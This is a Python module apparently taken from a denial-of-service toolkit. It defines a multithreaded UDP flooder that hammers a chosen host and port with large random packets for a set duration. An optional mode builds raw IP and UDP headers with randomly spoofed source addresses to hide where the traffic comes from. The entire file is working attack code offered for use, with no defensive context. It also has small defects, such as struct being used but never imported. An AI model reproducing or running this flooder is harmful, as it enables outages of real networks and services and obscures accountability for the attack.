import socket
import threading
import time
import random
from core.ip_spoof import random_ip

class UDPFlood:
    def __init__(self, target, port, threads, duration, spoof=False):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.spoof = spoof
        self.stop_event = threading.Event()

    def _send_udp(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(65000)
        while not self.stop_event.is_set():
            try:
                sock.sendto(payload, (self.target, self.port))
            except Exception:
                pass

    def _send_udp_spoofed(self):
        # Raw socket with IP spoofing
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except Exception:
            return self._send_udp()

        payload = random._urandom(1500)
        while not self.stop_event.is_set():
            src_ip = random_ip()
            # IP header + UDP header
            ip_header = self._build_ip_header(src_ip, self.target)
            udp_header = self._build_udp_header(self.port)
            try:
                sock.sendto(ip_header + udp_header + payload, (self.target, self.port))
            except Exception:
                pass

    def _build_ip_header(self, src, dst):
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 20 + 8 + 1500
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_UDP
        ip_check = 0
        ip_saddr = socket.inet_aton(src)
        ip_daddr = socket.inet_aton(dst)

        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len,
                                ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check,
                                ip_saddr, ip_daddr)
        ip_check = self._checksum(ip_header)
        ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len,
                                ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check,
                                ip_saddr, ip_daddr)
        return ip_header

    def _build_udp_header(self, port):
        src_port = random.randint(1024, 65535)
        length = 8 + 1500
        checksum = 0
        return struct.pack('!HHHH', src_port, port, length, checksum)

    def _checksum(self, data):
        if len(data) % 2 == 1:
            data += b'\x00'
        s = sum(struct.unpack('!%dH' % (len(data)//2), data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff

    def start(self):
        threads = []
        if self.spoof:
            target_func = self._send_udp_spoofed
        else:
            target_func = self._send_udp

        for _ in range(self.threads):
            t = threading.Thread(target=target_func)
            t.daemon = True
            t.start()
            threads.append(t)

        time.sleep(self.duration)
        self.stop_event.set()
        for t in threads:
            t.join(timeout=1)

def attack(target, port, threads, duration, spoof=False):
    flood = UDPFlood(target, port, threads, duration, spoof)
    flood.start()
